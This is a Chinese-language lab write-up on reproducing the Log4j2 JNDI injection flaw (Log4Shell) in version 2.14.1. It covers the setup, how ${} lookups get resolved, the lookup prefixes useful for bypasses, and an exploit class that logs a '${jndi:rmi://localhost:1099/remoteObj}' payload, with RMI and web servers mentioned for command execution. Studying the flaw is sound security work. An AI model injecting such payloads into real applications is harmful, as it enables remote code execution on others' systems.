---
title: Java安全-Log4j2
date: 2025-10-3 20:00:00
tags: JAVA
categories: JAVA安全-JAVA反序列化
---

## 环境搭建

- jdk8u65

- Log4j2 2.14.1
- CC 3.2.1 
- pom.xml中添加

```xml
<dependency>  
 <groupId>org.apache.logging.log4j</groupId>  
 <artifactId>log4j-core</artifactId>  
 <version>2.14.1</version>  
</dependency>   
<dependency>  
 <groupId>org.apache.logging.log4j</groupId>  
 <artifactId>log4j-api</artifactId>  
 <version>2.14.1</version>  
</dependency>  
<dependency>  
 <groupId>junit</groupId>  
 <artifactId>junit</artifactId>  
 <version>4.12</version>  
 <scope>test</scope>  
</dependency>
```

## 漏洞复现

log4j2.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>

<configuration status="info">
 <Properties>
 <Property name="pattern1">[%-5p] %d %c - %m%n</Property>
 <Property name="pattern2">
 =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n
        </Property>
 <Property name="filePath">logs/myLog.log</Property>
 </Properties>
 <appenders> <Console name="Console" target="SYSTEM_OUT">
 <PatternLayout pattern="${pattern1}"/>
 </Console> <RollingFile name="RollingFile" fileName="${filePath}"
 filePattern="logs/$${date:yyyy-MM}/app-%d{MM-dd-yyyy}-%i.log.gz">
 <PatternLayout pattern="${pattern2}"/>
 <SizeBasedTriggeringPolicy size="5 MB"/>
 </RollingFile>
	</appenders>
	<loggers>
		<root level="info">
 <appender-ref ref="Console"/>
 <appender-ref ref="RollingFile"/>
 </root>
</loggers>
</configuration>
```

正常使用环境，将登录信息打印到日志里

```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;  
  
import java.util.function.LongFunction;  
  
public class RealEnv {  
    public static void main(String[] args) {  
        Logger logger = LogManager.getLogger(LongFunction.class);  
  
 String username = "BOB";
 if (username != null) {  
            logger.info("User {} login in!", username);  
 }  
        else {  
            logger.error("User {} not exists", username);  
 }  
    }  
}
```

正常输出结果应该是这样

![image-20251005174134813](./Java%E5%AE%89%E5%85%A8-Log4j2/image-20251005174134813.png)

但是username这个String字符串是可控的，如果替换为`${java:os}`，就会打印系统信息，但这个在官方文档中是自带的功能

![image-20251005174245566](./Java%E5%AE%89%E5%85%A8-Log4j2/image-20251005174245566.png)

经过调试就可以知道最后走到了lookup函数

![image-20251005175415796](./Java%E5%AE%89%E5%85%A8-Log4j2/image-20251005175415796.png)

但是这个函数下的lookup是基于JNDI的，所以可以使用前面降到的JNDI的reference攻击



可以自己断点调试一下，主要就是这些内容

1. 先判断内容中是否有`${}`，然后截取`${}`中的内容，得到我们的恶意payload `jndi:xxx`
2. 后使用`:`分割payload，通过前缀来判断使用何种解析器去`lookup`
3. 支持的前缀包括 `date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j`，后续我们的绕过可能会用到这些。

### exp

```java
package org.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.function.LongFunction;

public class RealEnv {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger(LongFunction.class);

 String username = "${jndi:rmi://localhost:1099/remoteObj}";
 if (username != null) {
            logger.info("User {} login in!", username);
 }
        else {
            logger.error("User {} not exists", username);
 }
    }
}
```

同时需要`rmiserver`和`webserver`，就可以实现命令执行